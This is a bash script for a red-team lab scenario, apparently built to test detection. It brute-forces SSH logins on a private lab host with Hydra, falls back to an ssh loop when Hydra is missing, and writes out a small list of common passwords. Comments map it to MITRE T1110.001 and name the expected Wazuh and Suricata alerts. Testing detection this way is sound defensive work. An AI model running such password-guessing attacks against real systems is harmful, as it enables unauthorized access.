#!/usr/bin/env bash
# Scénario RT-01 — Brute-force SSH via Hydra (lab uniquement)
# Source : VM 107 (192.168.20.18) · Cible par défaut : portail 192.168.20.20
# MITRE : T1110.001 (Brute Force: Password Guessing)
#
# Détection attendue :
#   - Wazuh agent srv-web-1 : rules 5710 / 5712 (auth.log)
#   - Suricata eve.json : flows/alerts SSH depuis .18 vers .20
set -euo pipefail

CIBLE="${1:-192.168.20.20}"
USER_FAKE="${USER_FAKE:-attacker-demo}"
THREADS="${THREADS:-4}"
WORDLIST="${WORDLIST:-/tmp/rt01-wordlist.txt}"
TRIES="${TRIES:-10}"

log() { echo "[*] $*"; }

echo "=============================================="
echo " RT-01 Brute-force SSH (Hydra)"
echo " Heure début : $(date '+%Y-%m-%d %H:%M:%S %Z')"
echo " Source      : $(hostname) ($(hostname -I | awk '{print $1}'))"
echo " Cible       : ${CIBLE}:22"
echo " Utilisateur : ${USER_FAKE}"
echo " MITRE       : T1110.001"
echo " Outil       : hydra (fallback: boucle ssh si absent)"
echo "=============================================="

# Wordlist lab — mots de passe fictifs uniquement
cat > "${WORDLIST}" <<'EOF'
wrongpass1
wrongpass2
WrongPass2026
admin123
password
letmein
qwerty
NexaMind2026
test1234
attacker-demo
EOF

run_hydra() {
  log "Wordlist : ${WORDLIST} ($(wc -l < "${WORDLIST}") entrées)"
  log "Commande : hydra -l ${USER_FAKE} -P ${WORDLIST} ssh://${CIBLE} -t ${THREADS} -f -V"
  echo ""
  hydra -l "${USER_FAKE}" -P "${WORDLIST}" "ssh://${CIBLE}" \
    -t "${THREADS}" -f -V -o "/tmp/rt01-hydra-${CIBLE}.txt" 2>&1 || true
  echo ""
  if [[ -f "/tmp/rt01-hydra-${CIBLE}.txt" ]]; then
    log "Rapport Hydra : /tmp/rt01-hydra-${CIBLE}.txt"
    tail -5 "/tmp/rt01-hydra-${CIBLE}.txt" 2>/dev/null || true
  fi
}

run_ssh_fallback() {
  log "Fallback — boucle ssh (${TRIES} tentatives, Hydra indisponible)"
  for i in $(seq 1 "$TRIES"); do
    echo "[*] Tentative ${i}/${TRIES} → ${USER_FAKE}@${CIBLE}"
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes \
      "${USER_FAKE}@${CIBLE}" exit 2>/dev/null || true
    sleep 1
  done
}

if command -v hydra >/dev/null 2>&1; then
  run_hydra
else
  run_ssh_fallback
fi

echo ""
echo "[*] Fin RT-01 — $(date '+%Y-%m-%d %H:%M:%S')"
echo "[*] Wazuh  : https://192.168.20.22 → authentication_failed (5710/5712)"
echo "[*] Suricata : grep '\"event_type\":\"alert\"' /var/log/suricata/eve.json | grep ${CIBLE}"
